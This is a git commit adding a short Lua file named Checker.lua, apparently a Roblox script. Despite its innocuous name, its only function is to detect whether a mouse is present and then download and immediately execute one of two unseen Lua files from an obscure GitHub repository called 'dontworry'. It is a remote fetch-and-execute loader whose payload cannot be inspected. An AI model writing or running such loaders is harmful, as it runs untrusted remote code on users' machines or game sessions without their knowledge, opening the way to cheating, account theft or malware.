2cdc489ace426d00e8ded3dc1d0e07a936b49b64
fsdafzrdgfzrefzesfxsdfxrdg <zeka2465443346@gmail.com>
2025-04-28 23:18:30 +0300

    Create Checker.lua

---
+++ Checker.lua
@@ -0,0 +1,10 @@
+local input = game:GetService("UserInputService")
+
+local mousecheck = input.MouseEnabled
+
+wait(1)
+if mousecheck then
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfgszefeszf_k.lua"))()
+else
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/mb.lua"))()
+end
